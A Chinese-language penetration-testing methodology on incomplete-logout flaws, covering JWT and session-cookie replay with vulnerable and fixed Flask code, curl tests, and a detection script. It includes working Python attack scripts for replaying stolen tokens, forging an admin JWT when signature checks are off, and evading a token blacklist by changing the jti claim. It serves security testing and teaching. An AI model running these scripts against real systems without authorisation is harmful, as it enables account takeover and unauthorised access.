# 不完整登出攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本方法论文档旨在为渗透测试人员提供一套标准化、可复现的不完整登出攻击流程，针对应用程序在用户登出时未完全清除所有认证令牌（如 JWT、Session Cookie）的缺陷进行系统性测试与利用，实现令牌重放攻击和会话劫持。

### 1.2 适用范围
本文档适用于以下场景：
- 登出后 JWT 令牌未被清除或吊销
- 登出后会话 Cookie 仍然有效
- 多令牌认证系统（JWT+Session）部分清除
- JWT 无过期时间（exp claim 缺失）
- 无服务器端令牌吊销机制

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：JWT 令牌重放攻击

#### 2.1.1 技术介绍
不完整登出是指应用程序在用户登出时仅清除部分认证数据（如服务器端会话），但未清除或吊销客户端的认证令牌（如 JWT），导致攻击者可以重用这些令牌进行未授权访问。

**漏洞本质：** 应用程序缺乏完整的令牌吊销机制，登出操作未能使所有认证令牌失效。

**典型代码特征：**
```python
# 漏洞代码 - 仅清除 Session，未清除 JWT
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)  # 仅清除 Session
    return redirect(url_for('login'))
    # 缺少：response.set_cookie('auth_token', '', expires=0)

# JWT 无过期时间
token = jwt.encode({"user_id": 123}, secret, algorithm="HS256")
# 缺少：'exp': datetime.utcnow() + timedelta(hours=1)
```

#### 2.1.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 混合认证系统 | JWT+Session 双令牌 | 登出时仅清除 Session，JWT 仍可重用 |
| 单页应用 (SPA) | 前端存储 JWT | 登出后 JWT 仍保存在 localStorage |
| 移动端应用 | 本地存储认证令牌 | 登出后令牌未从设备删除 |
| 无状态 JWT 认证 | 纯 JWT 认证 | 无服务器端吊销机制 |
| CTF 挑战应用 | 认证绕过获取 flag | 登出后仍可访问他人数据 |

#### 2.1.3 漏洞探测方法

**黑盒测试：**

1. **基础登出测试**
   ```bash
   # 步骤 1：登录并捕获 JWT
   curl -i -c cookies.txt -X POST http://target/login \
     -d "username=test&password=test"
   
   # 从响应中提取 JWT
   # Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   
   # 步骤 2：验证 JWT 可访问受保护资源
   curl -b cookies.txt http://target/dashboard
   # 应返回 200 OK + 仪表板内容
   
   # 步骤 3：执行登出
   curl -i -b cookies.txt -X POST http://target/logout
   
   # 步骤 4：检查响应头中的 Set-Cookie
   # 如果有：Set-Cookie: auth_token=; Expires=Thu, 01 Jan 1970...
   # 说明 JWT 被正确清除
   # 如果没有 Set-Cookie 或 JWT 值不变，说明存在漏洞
   
   # 步骤 5：尝试用原 JWT 访问受保护资源
   curl -b cookies.txt http://target/dashboard
   # 如果仍返回 200 OK，说明 JWT 仍可重用
   ```

2. **JWT 重放测试**
   ```bash
   # 步骤 1：登录获取 JWT
   JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   
   # 步骤 2：登录新会话获取新 Session
   curl -c new_session.txt -X POST http/target/login \
     -d "username=test&password=test"
   
   # 步骤 3：用旧 JWT+ 新 Session 访问
   curl -b "new_session.txt; auth_token=$JWT" \
     http://target/dashboard
   
   # 如果访问成功，说明旧 JWT 仍可重用
   ```

3. **JWT 过期时间检查**
   ```python
   import jwt
   import base64
   import json
   
   token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   
   # 解码 payload（无需密钥）
   payload_b64 = token.split('.')[1]
   # 填充 Base64
   payload_b64 += '=' * (4 - len(payload_b64) % 4)
   payload = json.loads(base64.urlsafe_b64decode(payload_b64))
   
   print(f"Payload: {payload}")
   
   # 检查 exp claim
   if 'exp' not in payload:
       print("[!] JWT has NO expiration time - tokens valid forever!")
   else:
       from datetime import datetime
       exp_time = datetime.fromtimestamp(payload['exp'])
       print(f"Expiration: {exp_time}")
   ```

**白盒测试：**

1. **代码审计关键词搜索**
   ```bash
   # 搜索登出相关代码
   grep -rn "def logout\|@app.route.*logout" --include="*.py"
   grep -rn "function logout\|router.post.*logout" --include="*.js"
   
   # 搜索 Cookie 清除代码
   grep -rn "set_cookie.*expires\|resp.set_cookie.*0" --include="*.py"
   grep -rn "removeCookie\|clearCookie" --include="*.js"
   
   # 搜索 JWT 过期设置
   grep -rn "'exp'\|\"exp\"" --include="*.py"
   grep -rn "expiresIn\|exp:" --include="*.py"
   ```

2. **漏洞代码模式识别**
   ```python
   # 漏洞代码示例 1 - 未清除 JWT Cookie
   @app.route('/logout', methods=['POST'])
   def logout():
       session.pop('user_id', None)
       return redirect(url_for('login'))
       # 缺少：resp = redirect(...); resp.set_cookie('auth_token', '', expires=0)
   
   # 漏洞代码示例 2 - JWT 无过期时间
   token = jwt.encode({
       "user_id": user.id,
       "username": user.username
   }, secret, algorithm="HS256")
   # 缺少：'exp': datetime.utcnow() + timedelta(hours=1)
   ```

#### 2.1.4 漏洞利用方法

**基础利用 - 令牌重放：**

```python
import requests

# 步骤 1：登录并捕获 JWT
session1 = requests.Session()
session1.post("http://localhost:44191/password/test",
    data={"password": "test", "username": "test"})

# 从 Cookie 中提取 JWT
old_jwt = session1.cookies.get_dict().get('auth_token')
print(f"Captured JWT: {old_jwt}")

# 步骤 2：用户登出（模拟）
session1.post("http://localhost:44191/logout")

# 步骤 3：用户重新登录（获取新 Session）
session2 = requests.Session()
session2.post("http://localhost:44191/password/test",
    data={"password": "test", "username": "test"})

# 步骤 4：将旧 JWT 注入新会话
session2.cookies.set('auth_token', old_jwt)

# 步骤 5：用旧 JWT 访问受保护资源
response = session2.get("http://localhost:44191/dashboard")

if "Welcome" in response.text:
    print("[+] JWT REPLAY SUCCESSFUL - Old token still valid!")
    print(f"Response: {response.text[:200]}")
else:
    print("[-] JWT replay failed")
```

**进阶利用 - 令牌窃取与重用：**

```python
# 场景：攻击者通过 XSS 或网络拦截获取 JWT

import requests
import time

stolen_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 等待受害者登出（增加隐蔽性）
time.sleep(3600)  # 等待 1 小时

# 用窃取的 JWT 访问
session = requests.Session()
# 如果需要 Session 配合，先建立新会话
session.post("http://target/login", data={"user": "any", "pass": "any"})
session.cookies.set('auth_token', stolen_jwt)

response = session.get("http://target/account")
print(response.text)  # 访问受害者账户
```

**组合攻击 - JWT 伪造 + 重放：**

```python
import jwt

# 如果 JWT 签名验证也被禁用
# 1. 获取合法 JWT 结构
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0.xxx"

# 2. 修改为特权用户
payload = {
    "username": "admin",
    "user_id": 1,
    "role": "administrator"
}

# 3. 伪造 JWT（签名验证被禁用）
forged_jwt = jwt.encode(payload, "any_secret", algorithm="HS256")

# 4. 重放伪造的 JWT
import requests
session = requests.Session()
session.cookies.set('auth_token', forged_jwt)
response = session.get("http://target/admin/dashboard")
```

#### 2.1.5 漏洞利用绕过方法

**绕过 Session 检查：**

如果应用同时检查 Session 和 JWT：

```python
# 方法：保持有效 Session，仅替换 JWT
session = requests.Session()

# 建立合法 Session
session.post("http://target/login", data={"user": "attacker", "pass": "pass"})

# 保存合法 Session Cookie
valid_session = session.cookies.get_dict()

# 注入目标用户的 JWT
target_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
session.cookies.set('auth_token', target_jwt)

# 访问目标资源
response = session.get("http://target/admin/data")
```

**绕过 JWT 黑名单：**

如果应用实现了 JWT 黑名单：

```python
# 方法：修改 JWT 中的唯一标识符（如 jti claim）
import jwt

payload = {
    "user_id": 10019,
    "jti": "new_unique_id_123"  # 更改唯一标识
}

new_jwt = jwt.encode(payload, secret, algorithm="HS256")
# 新 JWT 有不同的 jti，可能绕过黑名单
```

---

### 专题二：会话 Cookie 重放

#### 2.2.1 技术介绍
会话 Cookie 重放是指应用程序在用户登出后未使服务器端会话失效，导致攻击者可以重用捕获的会话 Cookie 进行未授权访问。

#### 2.2.2 探测与利用

```python
import requests

# 步骤 1：登录获取 Session Cookie
session1 = requests.Session()
session1.post("http://target/login",
    data={"username": "victim", "password": "pass"})

session_cookie = session1.cookies.get_dict().get('session')
print(f"Session: {session_cookie}")

# 步骤 2：用户登出
session1.post("http://target/logout")

# 步骤 3：用原 Session Cookie 访问
session2 = requests.Session()
session2.cookies.set('session', session_cookie)

response = session2.get("http://target/dashboard")

if response.status_code == 200:
    print("[+] Session replay successful!")
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 攻击目标 | 测试方法 | 成功标志 |
|---------|---------|---------|
| JWT 重放 | 登出后用原 JWT 访问 | 返回 200 OK + 受保护内容 |
| Session 重放 | 登出后用原 Session 访问 | 返回 200 OK + 受保护内容 |
| JWT 过期检查 | 解码 JWT 检查 exp claim | 无 exp 或过期时间极远 |
| Cookie 清除检查 | 登出响应检查 Set-Cookie | 无 auth_token 清除头 |

### 3.2 自动化测试脚本

```python
#!/usr/bin/env python3
"""
不完整登出检测工具
用法：python incomplete_logout.py -t http://target
"""

import argparse
import requests

def test_incomplete_logout(target_url):
    """测试不完整登出漏洞"""
    
    # 登录
    session = requests.Session()
    login_response = session.post(f"{target_url}/login",
        data={"username": "test", "password": "test"})
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    # 获取 JWT
    original_jwt = session.cookies.get('auth_token')
    if not original_jwt:
        print("[-] No JWT cookie found")
        return False
    
    print(f"[*] Captured JWT: {original_jwt[:50]}...")
    
    # 验证 JWT 有效
    response = session.get(f"{target_url}/dashboard")
    if response.status_code != 200:
        print("[-] JWT not valid initially")
        return False
    
    print("[+] JWT is valid before logout")
    
    # 登出
    logout_response = session.post(f"{target_url}/logout")
    
    # 检查 Set-Cookie 头
    set_cookie = logout_response.headers.get('Set-Cookie', '')
    if 'auth_token' in set_cookie and 'Expires' in set_cookie:
        print("[+] JWT cookie cleared in logout response")
    else:
        print("[!] JWT cookie NOT cleared in logout response")
    
    # 尝试用原 JWT 访问
    session.cookies.set('auth_token', original_jwt)
    response = session.get(f"{target_url}/dashboard")
    
    if response.status_code == 200:
        print("[!] VULNERABILITY: JWT still valid after logout!")
        return True
    else:
        print("[+] JWT invalidated after logout")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    args = parser.parse_args()
    
    if test_incomplete_logout(args.target):
        print("\n[+] Incomplete logout vulnerability detected!")
    else:
        print("\n[-] No vulnerability detected")
```

### 3.3 防御建议

1. **完整清除所有令牌**
   ```python
   @app.route('/logout', methods=['POST'])
   def logout():
       # 清除 Session
       session.clear()
       
       # 清除 JWT Cookie
       response = redirect(url_for('login'))
       response.set_cookie('auth_token', '',
           expires=0,  # 立即过期
           httponly=True,
           secure=True,
           samesite='Lax'
       )
       return response
   ```

2. **设置 JWT 过期时间**
   ```python
   import datetime
   
   token = jwt.encode({
       "user_id": user.id,
       "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
   }, secret, algorithm="HS256")
   ```

3. **实施令牌吊销机制**
   ```python
   # 服务器端维护吊销列表
   REVOKED_TOKENS = set()
   
   @app.route('/logout', methods=['POST'])
   def logout():
       token = request.cookies.get('auth_token')
       REVOKED_TOKENS.add(token)  # 添加到吊销列表
       session.clear()
       return redirect(url_for('login'))
   
   def is_token_valid(token):
       if token in REVOKED_TOKENS:
           return False
       # 正常验证逻辑
   ```

4. **绑定会话与令牌**
   ```python
   # JWT 中包含 Session ID
   token = jwt.encode({
       "user_id": user.id,
       "session_id": session.sid
   }, secret, algorithm="HS256")
   
   # 验证时检查 Session 是否有效
   def validate_jwt(token):
       payload = jwt.decode(token, secret, algorithms=["HS256"])
       if payload['session_id'] != session.sid:
           return False  # Session 已变更
       return True
   ```

---

## 参考资源

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
